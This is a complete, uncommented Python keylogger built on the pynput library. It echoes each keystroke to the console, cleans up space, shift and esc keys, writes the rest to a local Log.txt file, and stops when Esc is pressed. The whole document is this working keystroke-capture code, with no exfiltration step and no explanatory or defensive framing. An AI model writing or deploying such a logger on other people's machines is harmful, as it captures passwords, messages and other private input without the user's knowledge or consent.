import pynput
from pynput.keyboard import Key,Listener
i=0
count=0
def pressed(key):
	global i,count,keylist
	print("{0} pressed".format(key))
	k=str(key).replace("'","")
	k=chars(k)
	if count==0:
		with open("Log.txt","w") as f:
			f.write(k)
			count=1
	else:
		with open("Log.txt","a") as f:
			f.write(k)

def released(key):
	if key==Key.esc:
		return False

def chars(k):
	if k.find("space")>0:
		k=" "
	elif k.find("shift")>0 or k.find("esc")>0:
		k=""
	else:
		return k

	return k
			
		
with Listener(on_press=pressed, on_release=released) as listener:
	listener.join()